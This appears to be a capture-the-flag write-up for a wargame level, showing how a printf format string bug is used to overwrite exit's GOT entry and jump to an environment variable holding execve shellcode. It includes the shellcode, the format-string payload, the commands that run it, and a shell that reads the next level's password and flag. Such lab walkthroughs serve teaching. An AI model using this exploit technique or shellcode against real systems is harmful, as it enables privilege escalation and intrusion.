

# Overwrite .got.plt table again

On this level we are provided with a program which takes a string as input via the **`gets()`** function, in the case of uppercase alphabetic characters these are transformed into lowercase letters before being printed by **`printf()`**.

```
08048444 <main>:
...
804846e:	8d 44 24 28          	lea    eax,[esp+0x28]
8048472:	89 04 24             	mov    DWORD PTR [esp],eax
8048475:	e8 d6 fe ff ff       	call   8048350 <fgets@plt>
804847a:	c7 84 24 8c 00 00 00 	mov    DWORD PTR [esp+0x8c],0x0
...
80484f3:	f2 ae                	repnz  scas al,BYTE PTR es:[edi]
80484f5:	89 c8                	mov    eax,ecx
80484f7:	f7 d0                	not    eax
80484f9:	83 e8 01             	sub    eax,0x1
80484fc:	39 c3                	cmp    ebx,eax
80484fe:	72 87                	jb     8048487 <main+0x43>
8048500:	8d 44 24 28          	lea    eax,[esp+0x28]
8048504:	89 04 24             	mov    DWORD PTR [esp],eax
8048507:	e8 34 fe ff ff       	call   8048340 <printf@plt>
```

Since no sanitize takes place on our input and it is handled by printf, we can use a **format string attack**.

We notice at the same time that the program will end with an **`exit()`**, the address of the latter is not yet resolved at this stage of the program, so let’s replace the field in the **got.plt** table  :

```
08048444 <main>:
...
8048513:	e8 58 fe ff ff       	call   8048370 <exit@plt>
...
08048370 <exit@plt>:
8048370:	ff 25 e0 97 04 08    	jmp    DWORD PTR ds:0x80497e0
...
0x80497e0 <exit@got.plt>:       0x08048376
```

Let's build our attack.

First we will inject a spawn shell code into an environment variable ( *using a **NOP slide** with shellcode can help to make exploits more reliable, as it provides a "buffer" of NOP instructions that can help to align the program's execution flow with the shellcode. This can help to prevent the exploit from failing due to small variations in the branch target address* ) :



    export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')


**got.plt** table addr: **`0x80497e0`**  

**env** var addr: **`0xffffd7d9`** / **`4294957017`**  
  
We notice that the address of the **env** var is a very large number, we will have to divide the overwrite operation into two parts.

```
1) d7d9 -> 55257 -> pad (55257 - 8) -> 55249
2) ffff -> 65535 -> pad (65535 - 55257) -> 10278

1st part addr: 0x80497e0
2th part addr: 0x80497e2

2th   1th 
[__|__|__|__] -> ??? [ff|ff|d7|d9]
```

```
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55249c%10$hn" + "%10278c%11$hn"' > /tmp/boom
cat /tmp/boom - | ./level05
```

```
whoami
level06
cat /home/users/level06/.pass            
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

> flag: h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
